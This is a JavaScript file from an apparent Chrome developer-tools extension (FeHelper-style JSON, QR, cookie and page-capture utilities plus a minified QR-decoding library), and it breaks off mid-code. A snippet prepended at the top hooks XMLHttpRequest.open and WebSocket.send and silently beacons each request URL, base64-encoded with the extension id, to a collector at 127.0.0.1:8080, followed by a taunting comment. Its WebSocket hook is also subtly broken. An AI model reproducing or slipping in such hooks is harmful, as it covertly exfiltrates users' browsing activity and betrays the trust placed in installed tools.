function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
let TRstaticjsmsg_type=function(e){return"object"==typeof e&&(e.exports={CODE_STANDARDS:"code_standards",FCP_HELPER_INIT:"fcp_helper_init",FCP_HELPER_DETECT:"fcp_helper_detect",GET_CSS:"get-css",GET_JS:"get-js",GET_HTML:"get-html",GET_COOKIE:"get-cookie",REMOVE_COOKIE:"remove-cookie",SET_COOKIE:"set-cookie",CSS_READY:"css-ready",JS_READY:"js-ready",HTML_READY:"html-ready",ALL_READY:"all-ready",GET_OPTIONS:"get_options",SET_OPTIONS:"set_options",MENU_SAVED:"menu_saved",START_OPTION:"start-option",OPT_START_FCP:"opt-item-fcp",CALC_PAGE_LOAD_TIME:"calc-page-load-time",GET_PAGE_WPO_INFO:"get_page_wpo_info",SHOW_PAGE_LOAD_TIME:"show-page-load-time",TAB_CREATED_OR_UPDATED:"tab_created_or_updated",REGEXP_TOOL:"regexp",EN_DECODE:"en-decode",JSON_FORMAT:"json-format",QR_CODE:"qr-code",CODE_BEAUTIFY:"code-beautify",JS_CSS_PAGE_BEAUTIFY:"JS_CSS_PAGE_BEAUTIFY",JS_CSS_PAGE_BEAUTIFY_REQUEST:"JS_CSS_PAGE_BEAUTIFY_REQUEST",CODE_COMPRESS:"code-compress",TIME_STAMP:"timestamp",IMAGE_BASE64:"image-base64",RANDOM_PASSWORD:"password",QR_DECODE:"qr-decode",JSON_COMPARE:"json-diff",JSON_PAGE_FORMAT:"JSON_PAGE_FORMAT",JSON_PAGE_FORMAT_REQUEST:"JSON_PAGE_FORMAT_REQUEST",COLOR_PICKER:"color-picker:newImage",SHOW_COLOR_PICKER:"show_color_picker",AJAX_DEBUGGER:"ajax-debugger",AJAX_DEBUGGER_CONSOLE:"ajax-debugger-console",AJAX_DEBUGGER_SWITCH:"ajax-debugger-switch",HTML_TO_MARKDOWN:"html2markdown",PAGE_CAPTURE:"page-capture",PAGE_CAPTURE_SCROLL:"page_capture_scroll",PAGE_CAPTURE_CAPTURE:"page_capture_capture",STICKY_NOTES:"sticky-notes",DEV_TOOLS:"dev-tools",OPEN_OPTIONS_PAGE:"open-options-page"}),e.exports}({exports:{}}),TRoptionssettings=function(e){let t=function(e){return"object"==typeof e&&(e.exports={CODE_STANDARDS:"code_standards",FCP_HELPER_INIT:"fcp_helper_init",FCP_HELPER_DETECT:"fcp_helper_detect",GET_CSS:"get-css",GET_JS:"get-js",GET_HTML:"get-html",GET_COOKIE:"get-cookie",REMOVE_COOKIE:"remove-cookie",SET_COOKIE:"set-cookie",CSS_READY:"css-ready",JS_READY:"js-ready",HTML_READY:"html-ready",ALL_READY:"all-ready",GET_OPTIONS:"get_options",SET_OPTIONS:"set_options",MENU_SAVED:"menu_saved",START_OPTION:"start-option",OPT_START_FCP:"opt-item-fcp",CALC_PAGE_LOAD_TIME:"calc-page-load-time",GET_PAGE_WPO_INFO:"get_page_wpo_info",SHOW_PAGE_LOAD_TIME:"show-page-load-time",TAB_CREATED_OR_UPDATED:"tab_created_or_updated",REGEXP_TOOL:"regexp",EN_DECODE:"en-decode",JSON_FORMAT:"json-format",QR_CODE:"qr-code",CODE_BEAUTIFY:"code-beautify",JS_CSS_PAGE_BEAUTIFY:"JS_CSS_PAGE_BEAUTIFY",JS_CSS_PAGE_BEAUTIFY_REQUEST:"JS_CSS_PAGE_BEAUTIFY_REQUEST",CODE_COMPRESS:"code-compress",TIME_STAMP:"timestamp",IMAGE_BASE64:"image-base64",RANDOM_PASSWORD:"password",QR_DECODE:"qr-decode",JSON_COMPARE:"json-diff",JSON_PAGE_FORMAT:"JSON_PAGE_FORMAT",JSON_PAGE_FORMAT_REQUEST:"JSON_PAGE_FORMAT_REQUEST",COLOR_PICKER:"color-picker:newImage",SHOW_COLOR_PICKER:"show_color_picker",AJAX_DEBUGGER:"ajax-debugger",AJAX_DEBUGGER_CONSOLE:"ajax-debugger-console",AJAX_DEBUGGER_SWITCH:"ajax-debugger-switch",HTML_TO_MARKDOWN:"html2markdown",PAGE_CAPTURE:"page-capture",PAGE_CAPTURE_SCROLL:"page_capture_scroll",PAGE_CAPTURE_CAPTURE:"page_capture_capture",STICKY_NOTES:"sticky-notes",DEV_TOOLS:"dev-tools",OPEN_OPTIONS_PAGE:"open-options-page"}),e.exports}({exports:{}});return e.exports=(()=>{let e=t,n=["opt_item_contextMenus","JSON_PAGE_FORMAT","EN_DECODE","CODE_BEAUTIFY","CODE_COMPRESS","JSON_FORMAT","JSON_COMPARE","QR_CODE","COLOR_PICKER","REGEXP_TOOL","TIME_STAMP","IMAGE_BASE64","FCP_HELPER_DETECT","SHOW_PAGE_LOAD_TIME","AJAX_DEBUGGER","JS_CSS_PAGE_BEAUTIFY","HTML_TO_MARKDOWN","PAGE_CAPTURE","RANDOM_PASSWORD","FORBID_OPEN_IN_NEW_TAB","MAX_JSON_KEYS_NUMBER","AUTO_TEXT_DECODE","STICKY_NOTES"],r={MENU_PAGE_ENCODING:{icon:"↺",text:"网页编码设置"},MENU_QRCODE_CREATE:{icon:"▣",text:"二维码生成器",contexts:["page","selection","editable","link","image"]},MENU_QRCODE_DECODE:{icon:"◈",text:"二维码解码器",contexts:["image"]},MENU_PAGE_CAPTURE:{icon:"✂",text:"页面滚动截屏"},MENU_COLOR_PICKER:{icon:"☀",text:"页面取色工具",contexts:["page","selection","editable"]},MENU_IMAGE_BASE64:{icon:"⇄",text:"图片与base64",contexts:["image"]},MENU_STR_ENDECODE:{icon:"♨",text:"字符串编解码",contexts:["page","selection","editable"]},MENU_JSON_FORMAT:{icon:"★",text:"JSON格式化",contexts:["page","selection","editable"]},MENU_JSON_COMPARE:{icon:"☃",text:"JSON比对器"},MENU_CODE_FORMAT:{icon:"☂",text:"代码美化工具",contexts:["page","selection","editable"]},MENU_CODE_COMPRESS:{icon:"〓",text:"代码压缩工具"},MENU_AJAX_DEBUGGER:{icon:"▶",text:"Ajax调试功能"},MENU_PAGE_OPTIMI:{icon:"√",text:"页面性能检测"},MENU_TIME_STAMP:{icon:"♖",text:"时间(戳)转换"},MENU_RANDOM_PASS:{icon:"☽",text:"随机密码生成"},MENU_JS_REGEXP:{icon:"✙",text:"JS正则表达式"},MENU_MARKDOWN_TL:{icon:"ⓜ",text:"markown工具"},MENU_CODE_STANDARD:{icon:"☊",text:"编码规范检测"},MENU_STICKY_NOTE:{icon:"▤",text:"我的便签笔记"}},i=()=>n.concat(Object.keys(r));return{getAllOpts:i,setOptsFromBgPage:function(e){i().forEach(t=>{e.some(e=>"string"==typeof e&&e===t?(localStorage.setItem(t,"true"),!0):!("object"!=typeof e||!e.hasOwnProperty(t)||(localStorage.setItem(t,e[t]),0)))||localStorage.setItem(t,"false")})},getOptsFromBgPage:function(e){if(e&&"function"==typeof e){let t={};i().forEach(e=>{let n=localStorage.getItem(e);"MAX_JSON_KEYS_NUMBER"===e?t[e]=n||1e4:"number"==typeof n?t[e]=n:"false"!==n&&(t[e]="true")}),e.call(null,t)}},getOptions:function(t){chrome.runtime.sendMessage({type:e.GET_OPTIONS},t)},setOptions:function(t){chrome.runtime.sendMessage({type:e.SET_OPTIONS,items:t})},getMenuOpts:function(){return r},didMenuSettingSaved:function(e){let t=!!localStorage.getItem("MENU_PAGE_ENCODING");if(!e||"function"!=typeof e)return t;e(t)},getDefaultContextMenus:function(){return["MENU_PAGE_ENCODING","MENU_QRCODE_CREATE","MENU_QRCODE_DECODE","MENU_PAGE_CAPTURE","MENU_COLOR_PICKER","MENU_IMAGE_BASE64","MENU_STR_ENDECODE","MENU_JSON_FORMAT","MENU_CODE_FORMAT"]},askMenuSavedOrNot:function(t){chrome.runtime.sendMessage({type:e.MENU_SAVED},t)}}})(),e.exports}({exports:{}}),TRbackgroundnetwork=function(e){return e.exports=(()=>{let e=function(e){return"http"+(e.secure?"s":"")+"://"+e.domain+e.path};return{readFileContent:function(e,t){let n=new XMLHttpRequest;n.onreadystatechange=function(){if(4===n.readyState){let r;r=200===n.status&&n.responseText?{success:!0,path:e,content:n.responseText}:{success:!1,path:e,content:"FcpHelper can't load such file."},t(r)}},n.open("GET",e,!0),n.setRequestHeader("Content-Type","text/plain;charset=UTF-8"),n.setRequestHeader("Access-Control-Allow-Origin","*"),n.send()},getCookies:function(t,n){let r=[];chrome.cookies.getAll({},function(i){for(let n=0,o=i.length;n<o;n++)t.url.indexOf(i[n].domain.substring(1))>-1&&(i[n].url=e(i[n]),r.push(i[n]));i.sort(function(e,t){return e.domain.localeCompare(t.domain)}),n.call(null,{cookie:r})})},removeCookie:function(t,n){chrome.cookies.getAll({},function(r){for(let i=0,o=r.length;i<o;i++){let o=e(r[i]),a=r[i].name;if(o==t.url&&a==t.name)return chrome.cookies.remove({url:o,name:a}),void(n&&"function"==typeof n&&n.call(null))}})},setCookie:function(t,n){chrome.cookies.getAll({},function(r){for(let i=0,o=r.length;i<o;i++){let o=e(r[i]),a=r[i].name;if(o==t.url&&a==t.name)return chrome.cookies.set(t),void(n&&"function"==typeof n&&n.call(null))}})}}})(),e.exports}({exports:{}}),TRpagecapturecaptureapi=function(e){return e.exports=function(e){let t,n=3e4,r=8e3,i=n*r,o=["http://*/*","https://*/*","ftp://*/*","file://*/*"],a=[/^https?:\/\/chrome.google.com\/.*$/],s={};function h(e,t,o){chrome.tabs.captureVisibleTab(null,{format:"png",quality:100},function(a){if(a){let s=new Image;s.onload=function(){if(e.image={width:s.width,height:s.height},e.windowWidth!==s.width){let t=s.width/e.windowWidth;e.x*=t,e.y*=t,e.totalWidth*=t,e.totalHeight*=t}t.length||Array.prototype.push.apply(t,function(e,t){let o,a,s,h,c,d=t>n||e>n||t*e>i,u=e>t,f=d?u?n:r:e,l=d?u?r:n:t,w=Math.ceil(e/f),_=Math.ceil(t/l),g=0,E=[];for(o=0;o<_;o++)for(a=0;a<w;a++)(s=document.createElement("canvas")).width=a===w-1&&e%f||f,s.height=o===_-1&&t%l||l,h=a*f,c=o*l,E.push({canvas:s,ctx:s.getContext("2d"),index:g,left:h,right:h+s.width,top:c,bottom:c+s.height}),g++;return E}(e.totalWidth,e.totalHeight)),function(e,t,n,r,i){let o=e+n,a=t+r;return i.filter(function(n){return e<n.right&&o>n.left&&t<n.bottom&&a>n.top})}(e.x,e.y,s.width,s.height,t).forEach(function(t){t.ctx.drawImage(s,e.x-t.left,e.y-t.top)}),o(e)},s.src=a}})}function c(n,r,i,s){let c=[],d=new Function;r=r||d,i=i||d,s=s||d,function(e){let t,n;for(n=a.length-1;n>=0;n--)if(a[n].test(e))return!1;for(n=o.length-1;n>=0;n--)if((t=new RegExp("^"+o[n].replace(/\*/g,".*")+"$")).test(e))return!0;return!1}(n.url)||i("invalid url"),void 0!==t&&chrome.runtime.onMessage.removeListener(t),t=function(t,n,i){if(t.type===e.PAGE_CAPTURE_CAPTURE)return s(t.complete),h(t,c,e=>{i(e),1===t.complete&&r(c)}),!0},chrome.runtime.onMessage.addListener(t),chrome.tabs.sendMessage(n.id,{type:e.PAGE_CAPTURE_SCROLL},()=>s(0))}function d(e){let t=e.split("?")[0].split("#")[0];return"fehelper"+(t=t?"-"+(t=t.replace(/^https?:\/\//,"").replace(/[^A-z0-9]+/g,"-").replace(/-+/g,"-").replace(/^[_\-]+/,"").replace(/[_\-]+$/,"")):"")+"-"+Date.now()+".png"}return{full:function(e){c(e,function(t){s={pageInfo:e,filename:d(e.url),imageURI:t.map(function(e){return e.canvas.toDataURL()})},chrome.tabs.create({url:"page-capture/index.html"})},e=>{BgPageInstance.notify({title:"糟糕，转换失败",message:e&&e.message||e||"稍后尝试刷新页面重试!"})},t=>{t=parseInt(100*t,10)+"%",chrome.tabs.executeScript(e.id,{code:'document.title="进度：'+t+' ...";'}),"100%"===t&&setTimeout(()=>{chrome.tabs.executeScript(e.id,{code:'document.title="'+e.title+'";'})},800)})},getCapturedData:function(){return s}}},e.exports}({exports:{}}),TRstaticvendorzxingzxingminjs=function(e){function t(e,t){this.count=e,this.dataCodewords=t,this.__defineGetter__("Count",function(){return this.count}),this.__defineGetter__("DataCodewords",function(){return this.dataCodewords})}function n(e,t,n){this.ecCodewordsPerBlock=e,this.ecBlocks=n?new Array(t,n):new Array(t),this.__defineGetter__("ECCodewordsPerBlock",function(){return this.ecCodewordsPerBlock}),this.__defineGetter__("TotalECCodewords",function(){return this.ecCodewordsPerBlock*this.NumBlocks}),this.__defineGetter__("NumBlocks",function(){for(var e=0,t=0;t<this.ecBlocks.length;t++)e+=this.ecBlocks[t].length;return e}),this.getECBlocks=function(){return this.ecBlocks}}function r(e,t,n,r,i,o){this.versionNumber=e,this.alignmentPatternCenters=t,this.ecBlocks=new Array(n,r,i,o);for(var a=0,s=n.ECCodewordsPerBlock,c=n.getECBlocks(),d=0;d<c.length;d++){var u=c[d];a+=u.Count*(u.DataCodewords+s)}this.totalCodewords=a,this.__defineGetter__("VersionNumber",function(){return this.versionNumber}),this.__defineGetter__("AlignmentPatternCenters",function(){return this.alignmentPatternCenters}),this.__defineGetter__("TotalCodewords",function(){return this.totalCodewords}),this.__defineGetter__("DimensionForVersion",function(){return 17+4*this.versionNumber}),this.buildFunctionPattern=function(){var e=this.DimensionForVersion,t=new h(e);t.setRegion(0,0,9,9),t.setRegion(e-8,0,8,9),t.setRegion(0,e-8,9,8);for(var n=this.alignmentPatternCenters.length,r=0;n>r;r++)for(var i=this.alignmentPatternCenters[r]-2,o=0;n>o;o++)0==r&&(0==o||o==n-1)||r==n-1&&0==o||t.setRegion(this.alignmentPatternCenters[o]-2,i,5,5);return t.setRegion(6,9,1,e-17),t.setRegion(9,6,e-17,1),this.versionNumber>6&&(t.setRegion(e-11,0,3,6),t.setRegion(0,e-11,6,3)),t},this.getECBlocksForLevel=function(e){return this.ecBlocks[e.ordinal()]}}function i(e,t,n,r,o,a,s,h,c){this.a11=e,this.a12=r,this.a13=s,this.a21=t,this.a22=o,this.a23=h,this.a31=n,this.a32=a,this.a33=c,this.transformPoints1=function(e){for(var t=e.length,n=this.a11,r=this.a12,i=this.a13,o=this.a21,a=this.a22,s=this.a23,h=this.a31,c=this.a32,d=this.a33,u=0;t>u;u+=2){var f=e[u],l=e[u+1],w=i*f+s*l+d;e[u]=(n*f+o*l+h)/w,e[u+1]=(r*f+a*l+c)/w}},this.transformPoints2=function(e,t){for(var n=e.length,r=0;n>r;r++){var i=e[r],o=t[r],a=this.a13*i+this.a23*o+this.a33;e[r]=(this.a11*i+this.a21*o+this.a31)/a,t[r]=(this.a12*i+this.a22*o+this.a32)/a}},this.buildAdjoint=function(){return new i(this.a22*this.a33-this.a23*this.a32,this.a23*this.a31-this.a21*this.a33,this.a21*this.a32-this.a22*this.a31,this.a13*this.a32-this.a12*this.a33,this.a11*this.a33-this.a13*this.a31,this.a12*this.a31-this.a11*this.a32,this.a12*this.a23-this.a13*this.a22,this.a13*this.a21-this.a11*this.a23,this.a11*this.a22-this.a12*this.a21)},this.times=function(e){return new i(this.a11*e.a11+this.a21*e.a12+this.a31*e.a13,this.a11*e.a21+this.a21*e.a22+this.a31*e.a23,this.a11*e.a31+this.a21*e.a32+this.a31*e.a33,this.a12*e.a11+this.a22*e.a12+this.a32*e.a13,this.a12*e.a21+this.a22*e.a22+this.a32*e.a23,this.a12*e.a31+this.a22*e.a32+this.a32*e.a33,this.a13*e.a11+this.a23*e.a12+this.a33*e.a13,this.a13*e.a21+this.a23*e.a22+this.a33*e.a23,this.a13*e.a31+this.a23*e.a32+this.a33*e.a33)}}function o(e){this.image=e,this.resultPointCallback=null,this.sizeOfBlackWhiteBlackRun=function(e,t,n,r){var i=Math.abs(r-t)>Math.abs(n-e);if(i){var o=e;e=t,t=o,o=n,n=r,r=o}for(var a=Math.abs(n-e),s=Math.abs(r-t),h=-a>>1,c=r>t?1:-1,d=n>e?1:-1,u=0,f=e,l=t;f!=n;f+=d){var w=i?l:f,_=i?f:l;if(1==u?this.image[w+_*qrcode.width]&&u++:this.image[w+_*qrcode.width]||u++,3==u){var g=f-e,E=l-t;return Math.sqrt(g*g+E*E)}if((h+=s)>0){if(l==r)break;l+=c,h-=a}}var m=n-e,p=r-t;return Math.sqrt(m*m+p*p)},this.sizeOfBlackWhiteBlackRunBothWays=function(e,t,n,r){var i=this.sizeOfBlackWhiteBlackRun(e,t,n,r),o=1,a=e-(n-e);0>a?(o=e/(e-a),a=0):a>=qrcode.width&&(o=(qrcode.width-1-e)/(a-e),a=qrcode.width-1);var s=Math.floor(t-(r-t)*o);return o=1,0>s?(o=t/(t-s),s=0):s>=qrcode.height&&(o=(qrcode.height-1-t)/(s-t),s=qrcode.height-1),a=Math.floor(e+(a-e)*o),(i+=this.sizeOfBlackWhiteBlackRun(e,t,a,s))-1},this.calculateModuleSizeOneWay=function(e,t){var n=this.sizeOfBlackWhiteBlackRunBothWays(Math.floor(e.X),Math.floor(e.Y),Math.floor(t.X),Math.floor(t.Y)),r=this.sizeOfBlackWhiteBlackRunBothWays(Math.floor(t.X),Math.floor(t.Y),Math.floor(e.X),Math.floor(e.Y));return isNaN(n)?r/7:isNaN(r)?n/7:(n+r)/14},this.calculateModuleSize=function(e,t,n){return(this.calculateModuleSizeOneWay(e,t)+this.calculateModuleSizeOneWay(e,n))/2},this.distance=function(e,t){return xDiff=e.X-t.X,yDiff=e.Y-t.Y,Math.sqrt(xDiff*xDiff+yDiff*yDiff)},this.computeDimension=function(e,t,n,r){var i=7+(Math.round(this.distance(e,t)/r)+Math.round(this.distance(e,n)/r)>>1);switch(3&i){case 0:i++;break;case 2:i--;break;case 3:throw"Error"}return i},this.findAlignmentInRegion=function(e,t,n,r){var i=Math.floor(r*e),o=Math.max(0,t-i),a=Math.min(qrcode.width-1,t+i);if(3*e>a-o)throw"Error";var s=Math.max(0,n-i),h=Math.min(qrcode.height-1,n+i);return new function(e,t,n,r,i,o,a){this.image=e,this.possibleCenters=new Array,this.startX=t,this.startY=n,this.width=r,this.height=i,this.moduleSize=o,this.crossCheckStateCount=new Array(0,0,0),this.resultPointCallback=a,this.centerFromEnd=function(e,t){return t-e[2]-e[1]/2},this.foundPatternCross=function(e){for(var t=this.moduleSize,n=t/2,r=0;3>r;r++)if(Math.abs(t-e[r])>=n)return!1;return!0},this.crossCheckVertical=function(e,t,n,r){var i=this.image,o=qrcode.height,a=this.crossCheckStateCount;a[0]=0,a[1]=0,a[2]=0;for(var s=e;s>=0&&i[t+s*qrcode.width]&&a[1]<=n;)a[1]++,s--;if(0>s||a[1]>n)return NaN;for(;s>=0&&!i[t+s*qrcode.width]&&a[0]<=n;)a[0]++,s--;if(a[0]>n)return NaN;for(s=e+1;o>s&&i[t+s*qrcode.width]&&a[1]<=n;)a[1]++,s++;if(s==o||a[1]>n)return NaN;for(;o>s&&!i[t+s*qrcode.width]&&a[2]<=n;)a[2]++,s++;if(a[2]>n)return NaN;var h=a[0]+a[1]+a[2];return 5*Math.abs(h-r)>=2*r?NaN:this.foundPatternCross(a)?this.centerFromEnd(a,s):NaN},this.handlePossibleCenter=function(e,t,n){var r=e[0]+e[1]+e[2],i=this.centerFromEnd(e,n),o=this.crossCheckVertical(t,Math.floor(i),2*e[1],r);if(!isNaN(o)){for(var a=(e[0]+e[1]+e[2])/3,s=this.possibleCenters.length,h=0;s>h;h++){var c=this.possibleCenters[h];if(c.aboutEquals(a,o,i))return new l(i,o,a)}var d=new l(i,o,a);this.possibleCenters.push(d),null!=this.resultPointCallback&&this.resultPointCallback.foundPossibleResultPoint(d)}return null},this.find=function(){for(var t=this.startX,i=this.height,o=t+r,a=n+(i>>1),s=new Array(0,0,0),h=0;i>h;h++){var c=a+(0==(1&h)?h+1>>1:-(h+1>>1));s[0]=0,s[1]=0,s[2]=0;for(var d=t;o>d&&!e[d+qrcode.width*c];)d++;for(var u=0;o>d;){if(e[d+c*qrcode.width])if(1==u)s[u]++;else if(2==u){if(this.foundPatternCross(s)){var f=this.handlePossibleCenter(s,c,d);if(null!=f)return f}s[0]=s[2],s[1]=1,s[2]=0,u=1}else s[++u]++;else 1==u&&u++,s[u]++;d++}if(this.foundPatternCross(s)){var f=this.handlePossibleCenter(s,c,o);if(null!=f)return f}}if(0!=this.possibleCenters.length)return this.possibleCenters[0];throw"Couldn't find enough alignment patterns"}}(this.image,o,s,a-o,h-s,e,this.resultPointCallback).find()},this.createTransform=function(e,t,n,r,o){var a,s,h,c,d=o-3.5;return null!=r?(a=r.X,s=r.Y,h=c=d-3):(a=t.X-e.X+n.X,s=t.Y-e.Y+n.Y,h=c=d),i.quadrilateralToQuadrilateral(3.5,3.5,d,3.5,h,c,3.5,d,e.X,e.Y,t.X,t.Y,a,s,n.X,n.Y)},this.sampleGrid=function(e,t,n){return GridSampler.sampleGrid3(e,n,t)},this.processFinderPatternInfo=function(e){var t=e.TopLeft,n=e.TopRight,i=e.BottomLeft,o=this.calculateModuleSize(t,n,i);if(1>o)throw"Error";var a=this.computeDimension(t,n,i,o),s=r.getProvisionalVersionForDimension(a),h=s.DimensionForVersion-7,c=null;if(s.AlignmentPatternCenters.length>0)for(var d=n.X-t.X+i.X,u=n.Y-t.Y+i.Y,f=1-3/h,l=Math.floor(t.X+f*(d-t.X)),w=Math.floor(t.Y+f*(u-t.Y)),_=4;16>=_;_<<=1){c=this.findAlignmentInRegion(o,l,w,_);break}var g=this.createTransform(t,n,i,c,a);return new function(e,t){this.bits=e,this.points=t}(this.sampleGrid(this.image,g,a),null==c?new Array(i,t,n):new Array(i,t,n,c))},this.detect=function(){var e=(new function(){this.image=null,this.possibleCenters=[],this.hasSkipped=!1,this.crossCheckStateCount=new Array(0,0,0,0,0),this.resultPointCallback=null,this.__defineGetter__("CrossCheckStateCount",function(){return this.crossCheckStateCount[0]=0,this.crossCheckStateCount[1]=0,this.crossCheckStateCount[2]=0,this.crossCheckStateCount[3]=0,this.crossCheckStateCount[4]=0,this.crossCheckStateCount}),this.foundPatternCross=function(e){for(var t=0,n=0;5>n;n++){var r=e[n];if(0==r)return!1;t+=r}if(7>t)return!1;var i=Math.floor((t<<O)/7),o=Math.floor(i/2);return Math.abs(i-(e[0]<<O))<o&&Math.abs(i-(e[1]<<O))<o&&Math.abs(3*i-(e[2]<<O))<3*o&&Math.abs(i-(e[3]<<O))<o&&Math.abs(i-(e[4]<<O))<o},this.centerFromEnd=function(e,t){return t-e[4]-e[3]-e[2]/2},this.crossCheckVertical=function(e,t,n,r){for(var i=this.image,o=qrcode.height,a=this.CrossCheckStateCount,s=e;s>=0&&i[t+s*qrcode.width];)a[2]++,s--;if(0>s)return NaN;for(;s>=0&&!i[t+s*qrcode.width]&&a[1]<=n;)a[1]++,s--;if(0>s||a[1]>n)return NaN;for(;s>=0&&i[t+s*qrcode.width]&&a[0]<=n;)a[0]++,s--;if(a[0]>n)return NaN;for(s=e+1;o>s&&i[t+s*qrcode.width];)a[2]++,s++;if(s==o)return NaN;for(;o>s&&!i[t+s*qrcode.width]&&a[3]<n;)a[3]++,s++;if(s==o||a[3]>=n)return NaN;for(;o>s&&i[t+s*qrcode.width]&&a[4]<n;)a[4]++,s++;if(a[4]>=n)return NaN;var h=a[0]+a[1]+a[2]+a[3]+a[4];return 5*Math.abs(h-r)>=2*r?NaN:this.foundPatternCross(a)?this.centerFromEnd(a,s):NaN},this.crossCheckHorizontal=function(e,t,n,r){for(var i=this.image,o=qrcode.width,a=this.CrossCheckStateCount,s=e;s>=0&&i[s+t*qrcode.width];)a[2]++,s--;if(0>s)return NaN;for(;s>=0&&!i[s+t*qrcode.width]&&a[1]<=n;)a[1]++,s--;if(0>s||a[1]>n)return NaN;for(;s>=0&&i[s+t*qrcode.width]&&a[0]<=n;)a[0]++,s--;if(a[0]>n)return NaN;for(s=e+1;o>s&&i[s+t*qrcode.width];)a[2]++,s++;if(s==o)return NaN;for(;o>s&&!i[s+t*qrcode.width]&&a[3]<n;)a[3]++,s++;if(s==o||a[3]>=n)return NaN;for(;o>s&&i[s+t*qrcode.width]&&a[4]<n;)a[4]++,s++;if(a[4]>=n)return NaN;var h=a[0]+a[1]+a[2]+a[3]+a[4];return 5*Math.abs(h-r)>=r?NaN:this.foundPatternCross(a)?this.centerFromEnd(a,s):NaN},this.handlePossibleCenter=function(e,t,n){var r=e[0]+e[1]+e[2]+e[3]+e[4],i=this.centerFromEnd(e,n),o=this.crossCheckVertical(t,Math.floor(i),e[2],r);if(!isNaN(o)&&(i=this.crossCheckHorizontal(Math.floor(i),Math.floor(o),e[2],r),!isNaN(i))){for(var a=r/7,s=!1,h=this.possibleCenters.length,c=0;h>c;c++){var d=this.possibleCenters[c];if(d.aboutEquals(a,o,i)){d.incrementCount(),s=!0;break}}if(!s){var u=new function(e,t,n){this.x=e,this.y=t,this.count=1,this.estimatedModuleSize=n,this.__defineGetter__("EstimatedModuleSize",function(){return this.estimatedModuleSize}),this.__defineGetter__("Count",function(){return this.count}),this.__defineGetter__("X",function(){return this.x}),this.__defineGetter__("Y",function(){return this.y}),this.incrementCount=function(){this.count++},this.aboutEquals=function(e,t,n){if(Math.abs(t-this.y)<=e&&Math.abs(n-this.x)<=e){var r=Math.abs(e-this.estimatedModuleSize);return 1>=r||r/this.estimatedModuleSize<=1}return!1}}(i,o,a);this.possibleCenters.push(u),null!=this.resultPointCallback&&this.resultPointCallback.foundPossibleResultPoint(u)}return!0}return!1},this.selectBestPatterns=function(){var e=this.possibleCenters.length;if(3>e)throw"Couldn't find enough finder patterns";if(e>3){for(var t=0,n=0,r=0;e>r;r++){var i=this.possibleCenters[r].EstimatedModuleSize;t+=i,n+=i*i}var o=t/e;this.possibleCenters.sort(function(e,t){var n=Math.abs(t.EstimatedModuleSize-o),r=Math.abs(e.EstimatedModuleSize-o);return r>n?-1:n==r?0:1});for(var a=Math.sqrt(n/e-o*o),s=Math.max(.2*o,a),r=0;r<this.possibleCenters.length&&this.possibleCenters.length>3;r++){var h=this.possibleCenters[r];Math.abs(h.EstimatedModuleSize-o)>s&&(this.possibleCenters.remove(r),r--)}}return this.possibleCenters.length>3&&this.possibleCenters.sort(function(e,t){return e.count>t.count?-1:e.count<t.count?1:0}),new Array(this.possibleCenters[0],this.possibleCenters[1],this.possibleCenters[2])},this.findRowSkip=function(){var e=this.possibleCenters.length;if(1>=e)return 0;for(var t=null,n=0;e>n;n++){var r=this.possibleCenters[n];if(r.Count>=y){if(null!=t)return this.hasSkipped=!0,Math.floor((Math.abs(t.X-r.X)-Math.abs(t.Y-r.Y))/2);t=r}}return 0},this.haveMultiplyConfirmedCenters=function(){for(var e=0,t=0,n=this.possibleCenters.length,r=0;n>r;r++){var i=this.possibleCenters[r];i.Count>=y&&(e++,t+=i.EstimatedModuleSize)}if(3>e)return!1;for(var o=t/n,a=0,r=0;n>r;r++)i=this.possibleCenters[r],a+=Math.abs(i.EstimatedModuleSize-o);return.05*t>=a},this.findFinderPattern=function(e){this.image=e;var t=qrcode.height,n=qrcode.width,r=Math.floor(3*t/(4*S));M>r&&(r=M);for(var i=!1,o=new Array(5),a=r-1;t>a&&!i;a+=r){o[0]=0,o[1]=0,o[2]=0,o[3]=0,o[4]=0;for(var s=0,h=0;n>h;h++)if(e[h+a*qrcode.width])1==(1&s)&&s++,o[s]++;else if(0==(1&s))if(4==s)if(this.foundPatternCross(o)){var c=this.handlePossibleCenter(o,a,h);if(c)if(r=2,this.hasSkipped)i=this.haveMultiplyConfirmedCenters();else{var d=this.findRowSkip();d>o[2]&&(a+=d-o[2]-r,h=n-1)}else{do{h++}while(n>h&&!e[h+a*qrcode.width]);h--}s=0,o[0]=0,o[1]=0,o[2]=0,o[3]=0,o[4]=0}else o[0]=o[2],o[1]=o[3],o[2]=o[4],o[3]=1,o[4]=0,s=3;else o[++s]++;else o[s]++;if(this.foundPatternCross(o)){var c=this.handlePossibleCenter(o,a,n);c&&(r=o[0],this.hasSkipped&&(i=haveMultiplyConfirmedCenters()))}}var u=this.selectBestPatterns();return qrcode.orderBestPatterns(u),new function(e){this.bottomLeft=e[0],this.topLeft=e[1],this.topRight=e[2],this.__defineGetter__("BottomLeft",function(){return this.bottomLeft}),this.__defineGetter__("TopLeft",function(){return this.topLeft}),this.__defineGetter__("TopRight",function(){return this.topRight})}(u)}}).findFinderPattern(this.image);return this.processFinderPatternInfo(e)}}function a(e){this.errorCorrectionLevel=s.forBits(e>>3&3),this.dataMask=7&e,this.__defineGetter__("ErrorCorrectionLevel",function(){return this.errorCorrectionLevel}),this.__defineGetter__("DataMask",function(){return this.dataMask}),this.GetHashCode=function(){return this.errorCorrectionLevel.ordinal()<<3|dataMask},this.Equals=function(e){var t=e;return this.errorCorrectionLevel==t.errorCorrectionLevel&&this.dataMask==t.dataMask}}function s(e,t,n){this.ordinal_Renamed_Field=e,this.bits=t,this.name=n,this.__defineGetter__("Bits",function(){return this.bits}),this.__defineGetter__("Name",function(){return this.name}),this.ordinal=function(){return this.ordinal_Renamed_Field}}function h(e,t){if(t||(t=e),1>e||1>t)throw"Both dimensions must be greater than 0";this.width=e,this.height=t;var n=e>>5;0!=(31&e)&&n++,this.rowSize=n,this.bits=new Array(n*t);for(var 